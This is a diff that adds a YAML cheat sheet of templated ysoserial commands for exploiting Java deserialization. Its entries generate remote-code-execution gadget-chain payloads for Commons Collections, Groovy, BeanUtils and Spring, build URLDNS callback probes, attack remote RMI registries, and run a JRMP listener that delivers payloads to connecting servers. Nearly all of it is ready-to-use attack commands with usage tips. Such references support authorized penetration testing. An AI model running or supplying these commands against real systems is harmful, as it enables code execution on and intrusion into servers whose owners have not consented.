@@ -1,0 +1,65 @@
+tool: ysoserial
+tags: [java, security, exploitation, deserialization, pentest, rce, infrastructure]
+
+# === PAYLOAD GENERATION ===
+
+actions:
+ - title: ysoserial - basic payload generation
+   desc: |
+     Generates a serialized Java object targeting a specific vulnerable library to execute a system command. 
+     This is the most common usage of the tool, where the output is binary data that must be delivered to a deserialization entry point. 
+     You must know or guess the classpath dependencies of the target application to select the correct gadget chain.
+   command: "java -jar ysoserial.jar {{payload_type|CommonsCollections1}} '{{command|calc.exe}}'"
+
+ - title: ysoserial - generate and save to file
+   desc: |
+     Generates a malicious serialized object and redirects the binary output into a specific file. 
+     This is essential when the exploit requires uploading a file or sending binary data via tools like curl or Burp Suite. 
+     Always use redirection (>) to ensure the binary integrity of the payload is maintained without console encoding issues.
+   command: "java -jar ysoserial.jar {{payload_type|CommonsCollections1}} '{{command|whoami}}' > {{output_file|payload.bin}}"
+
+ - title: ysoserial - dns exfiltration (URLDNS)
+   desc: |
+     Creates a payload that triggers a DNS lookup to a specified URL upon deserialization. 
+     This payload is extremely useful for "blind" deserialization vulnerabilities because it does not depend on any third-party libraries (it uses standard JDK classes). 
+     It is the primary method for confirming a vulnerability exists before attempting a more complex RCE gadget chain.
+   command: "java -jar ysoserial.jar URLDNS \"{{dns_callback_url}}\""
+
+# === EXPLOIT MODULES ===
+
+ - title: ysoserial - exploit RMI registry
+   desc: |
+     Executes a direct attack against a remote RMI Registry service. 
+     The exploit attempts to bind a malicious object into the registry, which triggers deserialization on the server side. 
+     This requires the target port (default 1099) to be accessible and the server to have vulnerable libraries in its classpath.
+   command: "java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit {{target_ip}} {{target_port|1099}} {{payload_type|CommonsCollections1}} '{{command|calc.exe}}'"
+
+ - title: ysoserial - start JRMP listener
+   desc: |
+     Starts a local JRMP (Java Remote Method Protocol) server that delivers a payload to any connecting client. 
+     This is used for "inbound" attacks where a vulnerable server is forced to connect back to the attacker (e.g., using a JRMPClient gadget). 
+     The attacker-controlled listener will then send the actual RCE payload (like CommonsCollections) to the target upon connection.
+   command: "java -cp ysoserial.jar ysoserial.exploit.JRMPListener {{listening_port|1099}} {{payload_type|CommonsCollections1}} '{{command|calc.exe}}'"
+
+# === COMMON GADGET CHAINS ===
+
+ - title: ysoserial - groovy library exploit
+   desc: |
+     Generates an exploit payload specifically for applications that include the Groovy runtime library. 
+     Groovy is a common dependency in modern Java applications and provides a reliable path to remote code execution. 
+     This gadget is often a good alternative when the more common Apache Commons Collections chains are patched.
+   command: "java -jar ysoserial.jar Groovy1 '{{command|touch /tmp/pwned}}'"
+
+ - title: ysoserial - common beansutils exploit
+   desc: |
+     Targets applications utilizing the Apache Commons BeanUtils library for property manipulation. 
+     This gadget chain is effective against many enterprise Java applications that use BeanUtils for data mapping. 
+     It is particularly useful when the environment has strict classloader restrictions that block other gadget chains.
+   command: "java -jar ysoserial.jar CommonsBeanutils1 '{{command|whoami}}'"
+
+ - title: ysoserial - spring framework exploit
+   desc: |
+     Targets the Spring Framework, one of the most widely used Java application frameworks. 
+     This payload utilizes classes within the Spring Core and Spring Beans modules to achieve code execution. 
+     It is highly effective against Spring-based microservices that expose deserialization endpoints.
+   command: "java -jar ysoserial.jar Spring1 '{{command|sleep 10}}'"
